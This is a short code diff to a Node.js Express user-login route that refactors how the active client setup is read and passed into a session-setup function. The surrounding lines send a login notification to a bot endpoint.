@@ -329,13 +329,14 @@ app.post('/users', async (req, res, next) => {
   const user = req.body;
   const db = ChannelService.getInstance();
   const cli = getClient(user.mobile);
-  if (!cli || getActiveClientSetup()?.phoneNumber !== user.mobile) {
+  const activeClientSetup = getActiveClientSetup()
+  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
     await db.insertUser(user);
     await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
   } else {
     setActiveClientSetup(undefined)
     console.log("New Session Generated");
-    await setNewClient(user);
+    await setNewClient(user, activeClientSetup);
     await deleteClient(user.mobile)
   }
 });
@@ -1779,11 +1780,10 @@ async function generateNewSession(phoneNumber) {
     console.log(error)
   }
 }
-async function setNewClient(user) {
+async function setNewClient(user, activeClientSetup) {
   try {
     const db = await ChannelService.getInstance();
     let mainAccount = user.userName?.replace("@", '')
-    const activeClientSetup = getActiveClientSetup()
     if (fetchNumbersFromString(activeClientSetup.clientId) == "2") {
       const mainUser = await db.getUserConfig({ clientId: activeClientSetup.clientId.replace("2", "1") });
       mainAccount = mainUser.userName;
